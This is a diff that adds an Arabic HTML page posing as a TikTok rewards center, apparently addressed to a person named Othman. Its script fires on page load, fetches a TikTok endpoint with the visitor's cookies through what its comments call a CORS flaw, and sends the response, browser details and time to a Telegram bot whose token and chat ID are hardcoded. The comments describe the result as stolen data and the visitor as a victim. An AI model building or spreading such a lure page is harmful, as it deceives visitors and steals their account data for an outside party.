@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز مكافآت تيك توك</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        h1 { color: #fe2c55; font-size: 24px; margin-bottom: 10px; }
+        p { color: #555; line-height: 1.6; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>تهانينا يا عثمان!</h1>
+        <p>جاري فحص حالة حسابك للتأهل للمكافأة السنوية...</p>
+        <div class="loader"></div>
+        <p style="font-size: 12px; color: #999;">يرجى الانتظار ثواني لمعالجة الطلب</p>
+    </div>
+
+    <script>
+        // إعدادات البوت والآيدي الخاص بك
+        const TELEGRAM_BOT_TOKEN = "8571853714:AAFC45zsOJFjS_d9xgopcJLloN9G-e2Vaw4"; //
+        const MY_CHAT_ID = "7918166858"; // الآيدي الخاص بك المستخرج
+        const VULNERABLE_URL = "https://mcs-va.tiktokv.com/list"; //
+
+        async function startExploit() {
+            try {
+                // 1. استغلال ثغرة CORS لسحب البيانات
+                const response = await fetch(VULNERABLE_URL, {
+                    method: "GET",
+                    credentials: "include" // إرسال الكوكيز الحقيقية
+                });
+                const data = await response.text();
+
+                // 2. تنسيق التقرير الذي سيصلك على تيليجرام
+                const reportMessage = `
+🚀 **تم صيد بيانات جديدة من تيك توك** 🚀
+━━━━━━━━━━━━━━━
+🔗 **الرابط المصاب:** ${VULNERABLE_URL}
+📦 **المحتوى المسروق:**
+\`\`\`json
+${data}
+\`\`\`
+🌍 **المتصفح:** ${navigator.userAgent}
+⏰ **التوقيت:** ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━
+                `;
+
+                // 3. إرسال البيانات فوراً إلى البوت
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: MY_CHAT_ID,
+                        text: reportMessage,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+                console.log("Success: Data sent to Telegram.");
+            } catch (err) {
+                console.error("Exploit execution error:", err);
+            }
+        }
+
+        // تشغيل الهجوم تلقائياً بمجرد دخول الضحية
+        window.onload = startExploit;
+    </script>
+</body>
+</html>
